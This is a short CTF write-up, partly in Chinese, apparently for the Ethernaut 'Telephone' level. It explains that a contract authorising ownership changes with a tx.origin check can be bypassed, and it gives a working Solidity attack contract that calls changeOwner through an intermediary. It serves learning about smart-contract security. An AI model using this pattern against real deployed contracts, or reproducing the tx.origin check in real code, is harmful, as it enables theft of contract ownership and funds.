## 0x01 Task

**Mission**: Take ownership

```javascript
pragma solidity ^0.4.18;

contract Telephone {

  address public owner;

  function Telephone() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```

## 0x02 Solution

`tx.origin`不太知道。

当我调用合约A中的函数，而在合约A中的函数内部调用了合约B的函数，这种情况下`tx.origin`指向的是我的地址，而`msg.sender`指向的是合约A的地址。

所以针对这道题，另外写个攻击合约就行了

```javascript
pragma solidity ^0.4.18;

contract Telephone {

  address public owner;

  function Telephone() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract Attack {
  Telephone phone;
  // replace target xxx by your instance address
  address target = xxx;

  function Attack() {
      phone = Telephone(target);
  }

  function claimOwnership() public {
      phone.changeOwner(msg.sender);
  }
}
```

检查owner地址

```javascript
await contract.owner()
```

